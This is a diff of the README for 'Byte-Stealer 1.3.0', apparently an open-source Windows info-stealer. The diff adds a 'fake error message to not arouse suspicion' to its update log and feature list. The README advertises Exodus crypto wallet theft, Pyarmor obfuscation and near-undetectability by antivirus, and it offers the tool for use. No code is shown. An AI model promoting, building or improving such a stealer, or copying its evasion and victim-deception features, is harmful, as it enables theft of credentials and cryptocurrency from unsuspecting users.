@@ -14,6 +14,7 @@ DO NOT USE LATEST RELEASE IT WILL NOT WORK, download the zip from here https://g
 # Byte-Stealer 1.3.0
 Current Update Log:
 ```
+Added fake error message
 Added Pyarmor for obfuscation
 Fixed Geolocation bug
 Fixed Buildexe.bat not working
@@ -41,6 +42,7 @@ Only works in windows 10/11
 • Crypto Wallet Stealer: Exodus👾
 • No local caching 💾
 • Obfuscation/F.U.D using pyarmor(only 4 antivirus detect in in virus total)
+• Fake error message to not arouse suspicion
 • Fully open source and easy to read/make changes or your own features
 ```
 ## Discord Screenshots:
